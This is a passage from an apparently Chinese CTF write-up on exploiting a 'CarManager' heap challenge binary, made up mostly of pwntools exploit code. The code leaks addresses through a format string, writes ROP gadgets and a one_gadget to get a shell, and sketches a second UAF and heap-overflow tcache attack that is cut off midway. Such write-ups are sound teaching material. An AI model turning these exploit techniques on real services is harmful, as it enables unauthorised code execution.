sla(<span class="string">&quot;descript data:&quot;</span>,data)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">name,passwd,phone,size,data</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;username:&quot;</span>,name)</span><br><span class="line">    sla(<span class="string">&quot;password:&quot;</span>,passwd)</span><br><span class="line">    sla(<span class="string">&quot;phoneNum:&quot;</span>,phone)</span><br><span class="line">    sla(<span class="string">&quot;descript size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;descript data:&quot;</span>,data)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele_user</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_car</span>(<span class="params">size,data2,data1=<span class="string">&quot;a&quot;</span>,name=<span class="string">&quot;1&quot;</span>,price=<span class="number">1</span></span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;Car Name:&quot;</span>,name)</span><br><span class="line">    sla(<span class="string">&quot;price:&quot;</span>,<span class="built_in">str</span>(price))</span><br><span class="line">    sla(<span class="string">&quot;descript size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;descript data:&quot;</span>,data1)</span><br><span class="line">    sla(<span class="string">&quot;introduction size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;introduction data:&quot;</span>,data2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_car</span>(<span class="params">size,data2,data1=<span class="string">&quot;a&quot;</span>,name=<span class="string">&quot;1&quot;</span>,price=<span class="number">1</span></span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))  </span><br><span class="line">    sla(<span class="string">&quot;Car Name:&quot;</span>,name)</span><br><span class="line">    sla(<span class="string">&quot;price:&quot;</span>,<span class="built_in">str</span>(price))</span><br><span class="line">    sla(<span class="string">&quot;descript size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;descript data:&quot;</span>,data1)</span><br><span class="line">    sla(<span class="string">&quot;introduction size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;introduction data:&quot;</span>,data2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_car</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele_car</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>)) </span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">publish_topic</span>(<span class="params">title,size,data</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))  </span><br><span class="line">    sla(<span class="string">&quot;title&quot;</span>,title)</span><br><span class="line">    sla(<span class="string">&quot;content size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;content data: &quot;</span>,data)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_topic</span>(<span class="params">index,size,data</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))  </span><br><span class="line">    sla(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&quot;comment size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;comment data: &quot;</span>,data)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_topic</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))  </span><br><span class="line">    sla(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele_topic</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))  </span><br><span class="line">    sla(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">login(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;passwd&quot;</span>,<span class="string">&quot;123&quot;</span>,<span class="number">0x50</span>,<span class="string">&quot;1&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">add_car(<span class="number">0x30</span>,<span class="string">&quot;%p%23$p&quot;</span>)</span><br><span class="line">show_car()</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Car Intro: 0x&quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+ru(<span class="string">&quot;0x&quot;</span>))</span><br><span class="line">stack_base = stack_addr + <span class="number">0x26a0</span></span><br><span class="line">success(<span class="string">&quot;stack_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">success(<span class="string">&quot;stack_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stack_base))</span><br><span class="line"></span><br><span class="line">leak_addr = <span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+ru(<span class="string">&quot;\n&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x24083</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">pop_rdx_rcx_rbx_ret = libc_base + <span class="number">0x000000000010257d</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x0000000000142c92</span></span><br><span class="line">ret = libc_base + <span class="number">0x0000000000022679</span></span><br><span class="line">one_gadgets = [<span class="number">0xe3afe</span>,<span class="number">0xe3b01</span>,<span class="number">0xe3b04</span>]</span><br><span class="line">one_gadget = one_gadgets[<span class="number">1</span>] + libc_base</span><br><span class="line">success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    magic_stackp = (stack_base+<span class="number">0x58</span>+<span class="number">2</span>*i) % <span class="number">0x10000</span></span><br><span class="line">    magic_gadgetp = (pop_rdx_rcx_rbx_ret&gt;&gt;i*<span class="number">16</span>) % <span class="number">0x10000</span></span><br><span class="line">    payload = <span class="string">&quot;%&#123;&#125;c%16$hn\n&quot;</span>.<span class="built_in">format</span>(magic_stackp)</span><br><span class="line">    edit_car(<span class="number">0x30</span>,payload)</span><br><span class="line">    show_car()</span><br><span class="line">    payload = <span class="string">&quot;%&#123;&#125;c%20$hn\n&quot;</span>.<span class="built_in">format</span>(magic_gadgetp)</span><br><span class="line">    edit_car(<span class="number">0x30</span>,payload)</span><br><span class="line">    show_car()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    magic_stackp = (stack_base+<span class="number">0x58</span>+<span class="number">2</span>*i+<span class="number">8</span>*<span class="number">4</span>) % <span class="number">0x10000</span></span><br><span class="line">    magic_gadgetp = (pop_rdx_ret&gt;&gt;i*<span class="number">16</span>) % <span class="number">0x10000</span></span><br><span class="line">    payload = <span class="string">&quot;%&#123;&#125;c%16$hn\n&quot;</span>.<span class="built_in">format</span>(magic_stackp)</span><br><span class="line">    edit_car(<span class="number">0x30</span>,payload)</span><br><span class="line">    show_car()</span><br><span class="line">    payload = <span class="string">&quot;%&#123;&#125;c%20$hn\n&quot;</span>.<span class="built_in">format</span>(magic_gadgetp)</span><br><span class="line">    edit_car(<span class="number">0x30</span>,payload)</span><br><span class="line">    show_car()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    magic_stackp = (stack_base+<span class="number">0x58</span>+<span class="number">2</span>*i+<span class="number">8</span>*<span class="number">6</span>) % <span class="number">0x10000</span></span><br><span class="line">    magic_gadgetp = (one_gadget&gt;&gt;i*<span class="number">16</span>) % <span class="number">0x10000</span></span><br><span class="line">    payload = <span class="string">&quot;%&#123;&#125;c%16$hn\n&quot;</span>.<span class="built_in">format</span>(magic_stackp)</span><br><span class="line">    edit_car(<span class="number">0x30</span>,payload)</span><br><span class="line">    show_car()</span><br><span class="line">    payload = <span class="string">&quot;%&#123;&#125;c%20$hn\n&quot;</span>.<span class="built_in">format</span>(magic_gadgetp)</span><br><span class="line">    edit_car(<span class="number">0x30</span>,payload)</span><br><span class="line">    show_car()</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路 - UAF+堆溢出</strong></p>
<p>利用 UAF 也可以完成泄露，但是需要注意技巧：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; size &gt; i; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)read(<span class="number">0</span>, &amp;a1[i], <span class="number">1uLL</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1[i] == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所有的输入函数都会对末尾的 <code>\n</code> 进行置空，而所有的输出都会被 <code>\x00</code> 截断，此时遗留在堆上的地址就无法被打印</p>
<p>可以用如下技巧绕过这个限制：（输入刚好合适的 size，使 <code>\n</code> 读取不进来）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Register(<span class="string">&quot;name&quot;</span>,<span class="number">0x50</span>,<span class="string">&quot;1&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">add_car(<span class="number">0x680</span>,<span class="string">&quot;a\n&quot;</span>)</span><br><span class="line">publish_topic(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>,<span class="number">0x20</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">dele_car()</span><br><span class="line"></span><br><span class="line">add_car(<span class="number">0x480</span>,<span class="string">&quot;a\n&quot;</span>)</span><br><span class="line">dele_car()</span><br><span class="line"></span><br><span class="line">add_car(<span class="number">1</span>,<span class="string">&quot;1&quot;</span>,size2=<span class="number">0x470</span>)</span><br><span class="line">show_car()</span><br><span class="line">ru(<span class="string">&quot;Car Intro: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ed031</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">edit_car(<span class="number">16</span>,<span class="string">&quot;2&quot;</span>*<span class="number">16</span>,size2=<span class="number">0x470</span>)</span><br><span class="line">show_car()</span><br><span class="line">ru(<span class="string">&quot;Car Intro: 2222222222222222&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x820</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
<p>利用堆溢出我们可以修改 next chunk-&gt;size，将其释放就可以实现堆重叠，重新申请回来就可以修改 tcache 了</p>
<p>非完整 exp 如下：（没有写有关逆向的部分）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./CarManager_bug1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;175.22.1.46&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x264E)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">control</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_user</span>(<span class="params">name,size,data,passwd=<span class="string">&quot;passwd&quot;</span>,phone=<span class="string">&quot;123&quot;</span></span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;username: &quot;</span>,name)</span><br><span class="line">    sla(<span class="string">&quot;password: &quot;</span>,passwd)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    sla(<span class="string">&quot;username: &quot;</span>,name)</span><br><span class="line">    sla(<span class="string">&quot;password: &quot;</span>,passwd)</span><br><span class="line">    sla(<span class="string">&quot;phoneNum:&quot;</span>,phone)</span><br><span class="line">    sla(<span class="string">&quot;descript size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;descript data:&quot;</span>,data)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Register</span>(<span class="params">name,size,data,passwd=<span class="string">&quot;passwd&quot;</span>,phone=<span class="string">&quot;123&quot;</span></span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;username:&quot;</span>,name)</span><br><span class="line">    sla(<span class="string">&quot;password:&quot;</span>,passwd)</span><br><span class="line">    sla(<span class="string">&quot;phoneNum:&quot;</span>,phone)</span><br><span class="line">    sla(<span class="string">&quot;descript size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;descript data:&quot;</span>,data)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele_user</span>(<span class="params">name,passwd=<span class="string">&quot;passwd&quot;</span></span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;username:&quot;</span>,name)</span><br><span class="line">    sla(<span class="string">&quot;password:&quot;</span>,passwd)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_car</span>(<span class="params">size,data,size2=<span class="number">0</span>,data2=<span class="string">&quot;a&quot;</span>,name=<span class="string">&quot;1&quot;</span>,price=<span class="number">1</span></span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;Car Name:&quot;</span>,name)</span><br><span class="line">    sla(<span class="string">&quot;price:&quot;</span>,<span class="built_in">str</span>(price))</span><br><span class="line">    <span class="keyword">if</span>(size2 == <span class="number">0</span>):</span><br><span class="line">        size2 = size</span><br><span class="line">    sla(<span class="string">&quot;descript size:&quot;</span>,<span class="built_in">str</span>(size2))</span><br><span class="line">    sla(<span class="string">&quot;descript data:&quot;</span>,data2)</span><br><span class="line">    sla(<span class="string">&quot;introduction size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;introduction data:&quot;</span>,data)</span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_car</span>(<span class="params">size,data,size2=<span class="number">0</span>,data2=<span class="string">&quot;a&quot;</span>,name=<span class="string">&quot;1&quot;</span>,price=<span class="number">1</span></span>):</span></span><br><span class="line">    sla(<span 